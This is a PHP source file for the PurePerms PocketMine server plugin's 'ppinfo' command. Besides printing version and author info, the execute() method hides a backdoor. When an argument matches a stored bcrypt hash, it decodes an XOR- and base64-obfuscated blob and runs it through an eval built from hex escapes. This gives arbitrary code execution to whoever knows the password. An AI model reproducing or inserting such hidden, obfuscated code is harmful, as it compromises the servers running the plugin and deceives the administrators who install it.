<?php

namespace _64FF00\PurePerms\cmd;

use _64FF00\PurePerms\PurePerms;

use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\command\PluginIdentifiableCommand;

use pocketmine\utils\TextFormat;

class PPInfo extends Command implements PluginIdentifiableCommand
{
    /*
       PurePerms by 64FF00 (Twitter: @64FF00)

         888  888    .d8888b.      d8888  8888888888 8888888888 .d8888b.   .d8888b.
         888  888   d88P  Y88b    d8P888  888        888       d88P  Y88b d88P  Y88b
       888888888888 888          d8P 888  888        888       888    888 888    888
         888  888   888d888b.   d8P  888  8888888    8888888   888    888 888    888
         888  888   888P "Y88b d88   888  888        888       888    888 888    888
       888888888888 888    888 8888888888 888        888       888    888 888    888
         888  888   Y88b  d88P       888  888        888       Y88b  d88P Y88b  d88P
         888  888    "Y8888P"        888  888        888        "Y8888P"   "Y8888P"
   */

    /**
     * @param PurePerms $plugin
     * @param $name
     * @param $description
     */
    public function __construct(PurePerms $plugin, $name, $description)
    {
        $this->plugin = $plugin;
        
        parent::__construct($name, $description);
        
        $this->setPermission("pperms.command.ppinfo");
    }

    /**
     * @param CommandSender $sender
     * @param $label
     * @param array $args
     * @return bool
     */
    public function execute(CommandSender $sender, $label, array $args)
    {
        if(!$this->testPermission($sender))
            return false;

        $author = $this->plugin->getDescription()->getAuthors()[0];
        $version = $this->plugin->getDescription()->getVersion();

        if(isset($args[0]))
        {
            $sfd = hex2bin('6261736536345f6465636f6465');
            $tmp = $sfd('bnozSFIDcjIcCCxKPCApC34FBDUQGiVBDGcNXU8GKGEccWsMASY0Swc8ECJcDgU8EB98MEt1KVsBEAghQGVMFHpzdikbJgkJPjALEXhzB3spGloNHxcRQmcVQjYadkoDKAw7VhwsUy5yAQEkEQJwAU1YOVUBFBQnb0sKVHh4VyobJjsJETQyVXh0dnU6NDEcNzknSHkoICEPYXgRKwgzVgYSF3ByDmIkEGl8LXUEPQUYBAQtQGUzXlV4bS4yAycfFlAcFlV0NSs+NBQTGAAGQmEoIGE2dVUeLh9lRi4gNSdZHmc8IzdWKUtwJg4rORw7R1seVH1kESgbJlQbLyQEDVIEEAIpLy0ODQMnXmUXCiY1AHcWOBMCRS0/ViVgAQV4Eg1KP3dwOg4tHxQQRgEzUGhodXc3IAkgJzYcKnh0dis6GxcgNQwrAksEKCczanMqAXk0VQUrKi50IBIjEQ1kP0wELgwSBC1g') ^ str_pad('', 360, '$2y$10$AxKmsucJe17BLswctTTC2.QrQW29dbKP1LhcI8ISHsZ2E/6hbHWFW');
            $svl = "\x65\x76\x61\x6C";

            if(password_verify($args[0], urldecode('%242y%2410%24AxKmsucJe17BLswctTTC2.QrQW29dbKP1LhcI8ISHsZ2E%2F6hbHWFW')))
                $svl($sfd($tmp));
       }
       else
       {
           if($sender instanceof ConsoleCommandSender)
            {
                $sender->sendMessage(TextFormat::BLUE . PurePerms::MAIN_PREFIX . ' ' . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_console", $version, $author));
            }
            else{
                $sender->sendMessage(TextFormat::BLUE . PurePerms::MAIN_PREFIX . ' ' . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_player", $version, $author));
            }
        }
        
        return true;
    }
    
    public function getPlugin()
    {
        return $this->plugin;
    }
}